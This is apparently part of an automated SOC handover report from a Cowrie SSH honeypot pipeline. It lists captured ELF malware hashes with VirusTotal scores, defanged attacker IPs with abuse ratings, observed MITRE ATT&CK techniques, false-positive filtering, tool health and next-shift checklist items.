| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `176.65.148[.]127` | NL | Pfcloud UG | **100** ⚠️ | 33 |
| `1.71.143[.]145` | CN | CHINANET SHANXI PROVINCE NETWORK | **100** ⚠️ | 0 |
| `20.46.231[.]161` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `54.85.125[.]115` | US | Amazon Technologies Inc. | **100** ⚠️ | 10 |
| `167.99.180[.]254` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `118.26.110[.]171` | SG | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 20 |
| `20.2.83[.]149` | HK | Microsoft Corporation | **100** ⚠️ | 18 |
| `43.156.19[.]37` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `223.123.43[.]68` | PK | CMPak Limited | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (41 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 10 below threshold 25 | 14 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 93 cases |
| Tool 34  | Credential Extractor        | ✅ 25 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 41 filtered (44.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 9 recon entry/entries in table (5 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T13:17:03Z_
